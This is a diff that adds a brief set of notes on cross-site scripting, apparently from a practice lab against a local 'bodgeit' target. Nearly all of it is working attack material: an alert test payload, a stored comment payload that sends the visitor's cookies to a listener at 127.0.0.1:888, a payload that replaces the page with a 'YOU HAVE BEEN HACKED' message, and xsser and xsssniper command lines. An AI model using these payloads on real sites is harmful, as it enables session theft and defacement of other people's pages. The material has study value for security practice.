@@ -1,0 +1,17 @@
+Cross-site scripting Code
+
+To test vulnerability:
+type <script>alert('Hello')</script>
+then copyping that link, you can run the same js code anywhere, which can used to steal cookies, for example
+
+In comment write:
+"<script>document.write('img src= "http://127.0.0.1:888/'+document.cookie+'"')</script>
+
+To completely replace HTML code of page:
+<img src=x onerror="document.body.innerHTML='<h1>YOU HAVE BEEN HACKED</h1>'">
+
+xsser tool:
+xsser -u http://192.168.43.215 -g /bodgeit/search.jsp?q=XSS
+
+xsssniper tool:
+python3 xsssniper.py -u http://192.168.43.215/bodgeit/search.jsp?q=
